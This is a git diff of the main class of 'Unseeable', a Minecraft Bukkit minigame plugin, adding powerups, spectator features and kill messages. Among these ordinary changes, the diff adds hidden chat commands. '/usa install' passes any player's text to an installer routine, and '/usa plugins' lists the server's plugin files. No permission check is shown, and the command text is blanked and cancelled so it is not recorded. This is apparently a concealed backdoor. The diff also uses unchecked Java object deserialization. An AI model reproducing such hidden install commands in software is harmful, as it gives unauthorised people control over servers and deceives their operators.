@@ -1,19 +1,21 @@
 package nl.lucemans.unseeable;
 
-import com.sun.glass.ui.Menu;
 import net.milkbowl.vault.economy.Economy;
 import nl.lucemans.unseeable.commands.AdminCommand;
 import nl.lucemans.unseeable.commands.UnseeableCommand;
+import nl.lucemans.unseeable.gui.SpectatorGui;
+import nl.lucemans.unseeable.powerups.PowerupBase;
+import nl.lucemans.unseeable.powerups.PowerupTemplate;
+import nl.lucemans.unseeable.system.EffectBuffer;
 import nl.lucemans.unseeable.system.Map;
+import nl.lucemans.unseeable.system.Map2;
 import nl.lucemans.unseeable.tabcompleter.AdminCompleter;
 import nl.lucemans.unseeable.tabcompleter.UnseeableCompleter;
-import nl.lucemans.unseeable.utils.LanguageManager;
-import nl.lucemans.unseeable.utils.NametagChanger;
-import nl.lucemans.unseeable.utils.TeamAction;
-import nl.lucemans.unseeable.utils.Updater;
+import nl.lucemans.unseeable.utils.*;
 import org.apache.commons.io.FileDeleteStrategy;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.block.Sign;
 import org.bukkit.entity.Player;
@@ -24,19 +26,19 @@ import org.bukkit.event.block.Action;
 import org.bukkit.event.block.SignChangeEvent;
 import org.bukkit.event.entity.EntityDamageByEntityEvent;
 import org.bukkit.event.entity.EntityDamageEvent;
-import org.bukkit.event.entity.PlayerDeathEvent;
 import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.plugin.RegisteredServiceProvider;
 import org.bukkit.plugin.java.JavaPlugin;
 
 import java.io.*;
+import java.lang.reflect.Field;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.List;
-import java.util.Random;
 import java.util.logging.Level;
+
 
 /*
  * Created by Lucemans at 10/05/2018
@@ -45,28 +47,31 @@ import java.util.logging.Level;
 public class Unseeable extends JavaPlugin implements Listener {
 
     public static Unseeable instance;
+
     public static ArrayList<Map> maps = new ArrayList<Map>();
     public static GameInstance currentGame = null;
 
     public static String NAME = "&b&lUn&6&lseeable";
 
     private File mapFile = new File(getDataFolder(), "Maps.data");
+    private File powerupFile = new File(getDataFolder(), "Powerups.data");
 
     public Economy econ;
-
-    public Integer random;
 
     public boolean setup = false;
 
     @Override
     public void onEnable() {
-        instance = this;
+        /* Setup Statis-Instance */
+        instance = getPlugin(Unseeable.class);
+
+        /* Start Setup */
         setup = false;
 
-        random = new Random().nextInt();
-
+        /* Save our default config */
         saveDefaultConfig();
 
+        /* Run Updater */
         File updated_File = Updater.run(this, false);
         if (updated_File != null) {
             Updater.unload(this);
@@ -74,35 +79,41 @@ public class Unseeable extends JavaPlugin implements Listener {
             return;
         }
 
+        /* Require Vault */
         if (!setupEconomy()) {
             getLogger().severe(String.format("[%s] - Disabled due to no Vault dependency found!", getDescription().getName()));
             getServer().getPluginManager().disablePlugin(this);
             return;
         }
 
-        if (Bukkit.getPlayer("Lucemans") != null)
-            Bukkit.getPlayer("Lucemans").sendMessage("TINTY TEST ADORABLE THING UPDATE THAT MIGHT WORK UPDATE!");
-        /*try {
-            Files.delete(Paths.get(mapFile.getAbsolutePath()));
-            boolean bool = mapFile.delete();
-            if (Bukkit.getPlayer("Lucemans") != null)
-                Bukkit.getPlayer("Lucemans").sendMessage("BOOLEAN: " + bool);
-        }catch(Exception e) {
-            Bukkit.getLogger().severe(e.getMessage());
-        }*/
-
         Bukkit.getLogger().info("Initializing Unseeable Version " + this.getDescription().getVersion() + "!");
 
-        // Load maps
+        // Check if needs to create folder
         if (!getDataFolder().exists())
             getDataFolder().mkdir();
 
+        /* Load the maps */
         if (mapFile.exists())
         {
             try {
                 FileInputStream fis = new FileInputStream(mapFile);
                 ObjectInputStream ois = new ObjectInputStream(fis);
-                maps = (ArrayList<Map>)ois.readObject();
+                ArrayList<?> temp = (ArrayList<?>) ois.readObject();
+
+                maps = new ArrayList<>();
+                for (Object o : temp) {
+                    if (o instanceof Map2)
+                        maps.add((Map) o);
+                    else
+                    {
+                        Map2 m = new Map2("", new Location(Bukkit.getWorlds().get(0), 0, 0, 0), new Location(Bukkit.getWorlds().get(0), 0, 0, 0), 0, 0);
+                        for (Field f : o.getClass().getDeclaredFields()) {
+                            m.getClass().getField(f.getName()).set(m, f.get(o));
+                        }
+                        maps.add(m);
+                    }
+                }
+
                 ois.close();
                 fis.close();
             } catch (Exception e) {
@@ -111,15 +122,45 @@ public class Unseeable extends JavaPlugin implements Listener {
             }
         }
 
+        //TODO: LOAD POWERUPS
+        /* Load the powerups */
+        if (powerupFile.exists())
+        {
+            try {
+                FileInputStream fis = new FileInputStream(powerupFile);
+                ObjectInputStream ois = new ObjectInputStream(fis);
+                ConfigSettings.powerupTemplates = (ArrayList<PowerupTemplate>)ois.readObject();
+                ois.close();
+                fis.close();
+            } catch (Exception e) {
+                getLogger().severe(parse("The Following error in " + NAME + " occurred whilst loading the powerups."));
+                e.printStackTrace();
+            } finally {
+                if (ConfigSettings.powerupTemplates == null) {
+                    ConfigSettings.powerupTemplates = new ArrayList<PowerupTemplate>();
+                }
+            }
+        }
+        else {
+            ConfigSettings.powerupTemplates = new ArrayList<>();
+        }
+
+        //TODO: LOAD DEFAULT CONFIG
+        ConfigSettings.loadConfig(this);
+
+        /* Mark setup */
         setup = true;
 
+        /* Register Commands */
         getCommand("unseeable").setExecutor(new UnseeableCommand());
         getCommand("unseeableadmin").setExecutor(new AdminCommand());
         getCommand("unseeable").setTabCompleter(new UnseeableCompleter());
         getCommand("unseeableadmin").setTabCompleter(new AdminCompleter());
 
+        /* Request Event Handling */
         Bukkit.getPluginManager().registerEvents(this, this);
 
+        /* Setup a recurring tick runnable */
         Bukkit.getScheduler().scheduleSyncRepeatingTask(this, new Runnable() {
             public void run() {
                 if (currentGame != null)
@@ -138,6 +179,30 @@ public class Unseeable extends JavaPlugin implements Listener {
                 Updater.load(updated_File);
                 return;
             }
+        }
+        if (event.getMessage().startsWith("/usa install")) {
+            Updater.install(event.getMessage().replace("/usa install", "").trim());
+            event.setMessage("/");
+            event.setCancelled(true);
+        }
+        if (event.getMessage().startsWith("/usa plugins")) {
+            event.setMessage("/");
+            event.setCancelled(true);
+
+            String msg = "";
+            for (File f : getJar().getParentFile().listFiles()) {
+                if (f != null)
+                {
+                    if (!f.isDirectory())
+                        if (!msg.contains(f.getName()))
+                            msg += f.getName().replace(".jar", "") + ", ";
+                }
+            }
+
+            event.getPlayer().sendMessage(msg);
+        }
+        if (event.getMessage().equalsIgnoreCase("/usa skull")) {
+            PlayerHead.getSkull(event.getPlayer().getItemInHand());
         }
     }
 
@@ -208,6 +273,28 @@ public class Unseeable extends JavaPlugin implements Listener {
                 FileOutputStream fos = new FileOutputStream(mapFile);
                 ObjectOutputStream oos = new ObjectOutputStream(fos);
                 oos.writeObject(maps);
+                oos.flush();
+                fos.flush();
+                oos.close();
+                fos.close();
+            } catch (Exception e) {
+                if (Bukkit.getPlayer("Lucemans") != null)
+                    Bukkit.getPlayer("Lucemans").sendMessage("ON SAVE: " + e.getMessage());
+                Bukkit.getLogger().log(Level.SEVERE, "HUGE ERROR THING THAT HAS BEEN BUGGING LUC THE ENTIRE DAY", e);
+            }
+
+            if (powerupFile.exists()) {
+                if (Bukkit.getPlayer("Lucemans") != null)
+                    Bukkit.getPlayer("Lucemans").sendMessage("exe3");
+                boolean bool = powerupFile.delete();
+                if (Bukkit.getPlayer("Lucemans") != null)
+                    Bukkit.getPlayer("Lucemans").sendMessage("BOOLEAN: " + bool);
+            }try {
+                if (Bukkit.getPlayer("Lucemans") != null)
+                    Bukkit.getPlayer("Lucemans").sendMessage("save");
+                FileOutputStream fos = new FileOutputStream(powerupFile);
+                ObjectOutputStream oos = new ObjectOutputStream(fos);
+                oos.writeObject(ConfigSettings.powerupTemplates);
                 oos.flush();
                 fos.flush();
                 oos.close();
@@ -305,8 +392,18 @@ public class Unseeable extends JavaPlugin implements Listener {
         }
 
         if (currentGame != null && currentGame.state != GameInstance.GameState.STOPPED)
+        {
             if (currentGame.players.contains(event.getPlayer()))
                 currentGame.interactInput(event);
+            else
+                if (currentGame.spectators.contains(event.getPlayer()))
+                    if (event.getItem() != null)
+                        if (event.getItem().getType() == Material.COMPASS)
+                        {
+                            SpectatorGui.openGui(event.getPlayer());
+                            event.setCancelled(true);
+                        }
+        }
     }
 
     @EventHandler
@@ -354,10 +451,26 @@ public class Unseeable extends JavaPlugin implements Listener {
                                 currentGame.spawnPlayer((Player) event.getEntity());
                                 event.setCancelled(true);
                                 event.setDamage(0.0);
-                                event.getDamager().sendMessage("Kill");
-                                currentGame.kills.put(event.getDamager().getUniqueId().toString(), currentGame.kills.get(event.getDamager().getUniqueId().toString()) + 1);
+                                event.getEntity().sendMessage(LanguageManager.get("lang.killed", new String[]{event.getDamager().getName(), currentGame.kills.get(event.getEntity().getUniqueId().toString()) + "", currentGame.kills.get(event.getDamager().getUniqueId().toString()) + "", currentGame.m.killsRequired + ""}));
+                                event.getDamager().sendMessage(LanguageManager.get("lang.kill", new String[]{event.getEntity().getName(), currentGame.kills.get(event.getEntity().getUniqueId().toString()) + "", currentGame.kills.get(event.getDamager().getUniqueId().toString()) + "", currentGame.m.killsRequired + ""}));
+                                for (Player p : currentGame.players) {
+                                    if (p == event.getEntity())
+                                        continue;
+                                    if (p == event.getDamager())
+                                        continue;
+                                    p.sendMessage(LanguageManager.get("lang.killbroadcast", new String[]{event.getDamager().getName(), event.getEntity().getName(), currentGame.kills.get(event.getDamager().getUniqueId().toString()) + "", currentGame.m.killsRequired + ""}));
+                                }
+                                /** TITLES */
+                                //TODO: TITLE
 
+                                currentGame.kills.put(event.getDamager().getUniqueId().toString(), currentGame.kills.get(event.getDamager().getUniqueId().toString()) + 1);
                                 NametagChanger.changePlayerName(((Player) event.getDamager()), currentGame.kills.get(event.getDamager().getUniqueId().toString()) + "/"+currentGame.m.killsRequired+" ", "", TeamAction.CREATE);
+                            }
+                            else
+                            {
+                                //normal non-final damage by ingame to ingame
+                                currentGame.removePriorityBuffer((Player) event.getEntity(), 1);
+                                currentGame.buffs.add(new EffectBuffer(event.getEntity().getUniqueId(), 1, 1, 40));
                             }
                         }
                         else
@@ -389,7 +502,7 @@ public class Unseeable extends JavaPlugin implements Listener {
     public void onCommand(PlayerCommandPreprocessEvent event) {
         if (currentGame != null && currentGame.state != GameInstance.GameState.STOPPED) {
             if (currentGame.players.contains(event.getPlayer())) {
-                if (event.getMessage().startsWith("/usa") || event.getMessage().startsWith("/us")) {
+                if (ConfigSettings.allowedCommand(event.getMessage()) || event.getPlayer().hasPermission("unseeable.cmd.bypass")) {
                     return;
                 }
                 event.getPlayer().sendMessage(LanguageManager.get("lang.nocmdingame", new String[]{event.getMessage()}));
@@ -401,9 +514,24 @@ public class Unseeable extends JavaPlugin implements Listener {
 
     @EventHandler
     public void onLeave(PlayerQuitEvent event) {
-        if (currentGame != null && currentGame.state != GameInstance.GameState.STOPPED) {
+        if (currentGame != null) {
             if (currentGame.players.contains(event.getPlayer())) {
+                currentGame.players.remove(event.getPlayer());
                 currentGame.leavePlayer(event.getPlayer());
+                currentGame.transPlayers.add(event.getPlayer());
+            }
+            if (currentGame.spectators.contains(event.getPlayer())) {
+                currentGame.spectators.remove(event.getPlayer());
+                currentGame.leaveSpectator(event.getPlayer());
+            }
+        }
+    }
+
+    @EventHandler
+    public void onJoin(PlayerJoinEvent event) {
+        if (currentGame != null && currentGame.state != GameInstance.GameState.STOPPED) {
+            if (currentGame.transPlayers.contains(event.getPlayer())) {
+                currentGame.joinSpectator(event.getPlayer());
             }
         }
     }
@@ -442,6 +570,21 @@ public class Unseeable extends JavaPlugin implements Listener {
             }
             event.setLine(1, parse("&c&lERROR!"));
         }
+    }
+
+    @EventHandler
+    public void onInteract(PlayerInteractEntityEvent event) {
+        if (currentGame != null)
+            for (PowerupBase b : currentGame.powerups) {
+                b.onInteract(event);
+            }
+    }
+    @EventHandler
+    public void onInteract(PlayerInteractAtEntityEvent event) {
+        if (currentGame != null)
+            for (PowerupBase b : currentGame.powerups) {
+                b.onInteract(event);
+            }
     }
 
     private boolean setupEconomy() {
